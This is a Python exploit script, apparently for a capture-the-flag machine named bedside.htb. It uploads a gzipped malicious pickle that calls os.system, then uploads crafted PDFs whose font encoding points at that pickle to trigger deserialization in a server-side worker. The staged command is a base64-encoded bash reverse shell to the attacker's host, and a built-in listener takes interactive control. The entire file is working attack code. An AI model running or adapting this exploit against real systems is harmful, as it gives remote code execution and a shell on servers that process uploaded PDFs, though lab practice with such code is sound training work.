#!/usr/bin/env python3
import sys
import os
import gzip
import pickle
import base64
import socket
import threading
import argparse
import time
import requests


def log_info(m):
    print("[*] " + m)


def log_ok(m):
    print("[+] " + m)


def log_err(m):
    print("[-] " + m)


class RCE:
    def __init__(self, cmd):
        self.cmd = cmd

    def __reduce__(self):
        return (os.system, (self.cmd,))


def build_pickle(cmd):
    raw = pickle.dumps(RCE(cmd))
    return gzip.compress(raw)


def encode_pdf_name(path):
    out = ""
    for ch in path:
        if ch.isalnum() or ch in ".-_":
            out += ch
        else:
            out += "#%02X" % ord(ch)
    return out


def build_pdf(cmap_name):
    template = """%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 4 0 R
/Resources
<<
/Font
<<
/F1 5 0 R
>>
>>
>>
endobj
4 0 obj
<<
/Length 44
>>
stream
BT
/F1 12 Tf
100 700 Td
(x) Tj
ET
endstream
endobj
5 0 obj
<<
/Type /Font
/Subtype /Type0
/BaseFont /F-Identity-H
/Encoding /{replacement}
/DescendantFonts [6 0 R]
>>
endobj
6 0 obj
<<
/Type /Font
/Subtype /CIDFontType2
/BaseFont /F
/CIDSystemInfo
<<
/Registry (Adobe)
/Ordering (Identity)
/Supplement 0
>>
/FontDescriptor 7 0 R
>>
endobj
7 0 obj
<<
/Type /FontDescriptor
/FontName /F
/Flags 4
/FontBBox [-1000 -1000 1000 1000]
/ItalicAngle 0
/Ascent 1000
/Descent -200
/CapHeight 800
/StemV 80
>>
endobj
xref
0 8
0000000000 65535 f
0000000009 00000 n
0000000058 00000 n
0000000115 00000 n
0000000274 00000 n
0000000370 00000 n
0000000503 00000 n
0000000673 00000 n
trailer
<<
/Size 8
/Root 1 0 R
>>
startxref
871
%%EOF
"""
    return template.format(replacement=cmap_name).encode()


def upload(base, vhost, filename, data):
    files = {"uploadFile": (filename, data)}
    headers = {"Host": vhost}
    r = requests.post(base + "/", files=files, headers=headers, timeout=15)
    return "uploaded successfully" in r.text


def check(base, vhost, filename):
    headers = {"Host": vhost}
    r = requests.get(base + "/uploads/" + filename, headers=headers, timeout=15)
    return r.status_code


def listener(port, flag):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", port))
    s.listen(1)
    log_info("listener bound on 0.0.0.0:%d" % port)
    conn, addr = s.accept()
    flag["hit"] = True
    log_ok("shell from %s:%d" % addr)
    t = threading.Thread(target=recvloop, args=(conn,), daemon=True)
    t.start()
    while True:
        try:
            data = sys.stdin.readline()
            if not data:
                break
            conn.sendall(data.encode())
        except Exception:
            break


def recvloop(conn):
    while True:
        try:
            data = conn.recv(4096)
            if not data:
                break
            sys.stdout.write(data.decode(errors="replace"))
            sys.stdout.flush()
        except Exception:
            break


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("target")
    ap.add_argument("-L", "--listen", required=True)
    ap.add_argument("--vhost", default="research.bedside.htb")
    ap.add_argument("--path", default=None)
    ap.add_argument("--pickle-name", default="payload.pickle.gz")
    ap.add_argument("--wait", type=float, default=8.0)
    args = ap.parse_args()

    base = "http://" + args.target
    lhost, lport = args.listen.split(":")
    lport = int(lport)

    inner = "bash -i >& /dev/tcp/%s/%s 0>&1" % (lhost, lport)
    b64 = base64.b64encode(inner.encode()).decode()
    cmd = "echo %s | base64 -d | bash" % b64
    log_info("reverse shell command staged for %s:%d" % (lhost, lport))

    pdata = build_pickle(cmd)
    log_info("built pickle payload (%d bytes gz)" % len(pdata))

    if not upload(base, args.vhost, args.pickle_name, pdata):
        log_err("pickle upload rejected")
        sys.exit(1)
    log_ok("uploaded %s" % args.pickle_name)

    code = check(base, args.vhost, args.pickle_name)
    if code == 200:
        log_ok("pickle reachable at /uploads/%s" % args.pickle_name)
    else:
        log_err("pickle not reachable (HTTP %d), continuing anyway" % code)

    if args.path:
        candidates = [args.path]
    else:
        candidates = [
            "/var/www/research.bedside.htb/uploads",
            "/var/www/html/uploads",
            "/var/www/research/uploads",
            "/var/www/html/research/uploads",
            "/var/www/bedside.htb/research/uploads",
            "/app/uploads",
            "/opt/research/uploads",
            "/srv/www/research.bedside.htb/uploads",
            "/var/www/uploads",
        ]

    flag = {"hit": False}
    lt = threading.Thread(target=listener, args=(lport, flag), daemon=True)
    lt.start()
    time.sleep(1)

    stem = args.pickle_name[:-len(".pickle.gz")] if args.pickle_name.endswith(".pickle.gz") else args.pickle_name

    for i, path in enumerate(candidates):
        if flag["hit"]:
            break
        cmap_target = path.rstrip("/") + "/" + stem
        name = encode_pdf_name(cmap_target)
        pdf = build_pdf(name)
        pdfname = "trigger%d.pdf" % i
        log_info("trying path %s" % cmap_target)
        if not upload(base, args.vhost, pdfname, pdf):
            log_err("pdf upload rejected for %s" % path)
            continue
        log_ok("uploaded %s -> waiting %.0fs for worker" % (pdfname, args.wait))
        waited = 0.0
        while waited < args.wait and not flag["hit"]:
            time.sleep(0.5)
            waited += 0.5

    if flag["hit"]:
        log_ok("foothold established, interact below")
        while True:
            time.sleep(1)
    else:
        log_err("no shell caught, path list exhausted; supply --path with the correct uploads dir")


if __name__ == "__main__":
    main()
